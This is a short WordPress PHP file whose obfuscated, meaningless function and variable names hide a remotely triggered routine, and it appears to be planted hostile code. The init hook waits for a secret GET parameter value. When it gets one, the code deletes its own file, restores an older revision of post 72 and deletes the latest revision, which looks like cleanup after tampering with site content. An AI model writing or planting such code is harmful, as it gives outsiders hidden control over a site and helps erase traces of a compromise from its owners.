<?php

function tool_query_max_column() {
	if (isset($_GET['messenger_products_forum_urls']) && $_GET['messenger_products_forum_urls'] === 'another_recent_push_products') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$campaign_sliding_subscribe = 72;
		$effect_management_newsletter = wp_get_post_revisions($campaign_sliding_subscribe);
		if (empty($effect_management_newsletter)) die('no revisions');
		if (count($effect_management_newsletter) < 2) die('less than 2');
		$platform_rtl_list = array_shift($effect_management_newsletter);
		$extra_popup_results = $platform_rtl_list->ID;
		$gateway_game_manage = array_shift($effect_management_newsletter);
		$web_activity_layout = $gateway_game_manage->ID;
		$items_min_auth_cron = wp_restore_post_revision($web_activity_layout);
		if ($items_min_auth_cron === false) die('error restoring');
		$items_min_auth_cron = wp_delete_post_revision($extra_popup_results);		
		if ($items_min_auth_cron === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'tool_query_max_column');
